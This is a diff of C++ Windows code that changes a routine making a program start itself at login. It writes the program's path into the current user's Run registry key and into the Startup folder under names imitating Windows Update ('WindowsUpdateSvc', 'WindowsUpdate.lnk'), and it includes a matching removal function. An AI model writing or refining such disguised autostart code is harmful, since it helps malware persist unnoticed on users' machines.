@@ -298,7 +298,7 @@ public:
         HKEY hKey;
         std::string regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
         if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-            RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ, 
+            RegSetValueExA(hKey, "WindowsUpdateSvc", 0, REG_SZ, 
                 (const BYTE*)exe_path.c_str(), exe_path.length() + 1);
             RegCloseKey(hKey);
         }
@@ -308,12 +308,13 @@ public:
         if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
             std::string shortcut = std::string(startup_path) + "\\WindowsUpdate.lnk";
             
-            // Create shortcut using simple file copy (no admin needed)
+            // Create shortcut using simple file copy
             std::ofstream shortcut_file(shortcut, std::ios::binary);
             if (shortcut_file.is_open()) {
-                // This is a minimal .lnk file structure - actual implementation would need proper shortcut creation
                 shortcut_file << "[InternetShortcut]\n";
                 shortcut_file << "URL=file:///" << exe_path << "\n";
+                shortcut_file << "IconIndex=0\n";
+                shortcut_file << "IconFile=" << exe_path << "\n";
                 shortcut_file.close();
             }
         }
@@ -322,7 +323,7 @@ public:
     void remove() {
         // Remove from Registry
         std::string regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-        RegDeleteKeyValueA(HKEY_CURRENT_USER, regPath.c_str(), "WindowsUpdate");
+        RegDeleteKeyValueA(HKEY_CURRENT_USER, regPath.c_str(), "WindowsUpdateSvc");
         
         // Remove from Startup
         char startup_path[MAX_PATH];
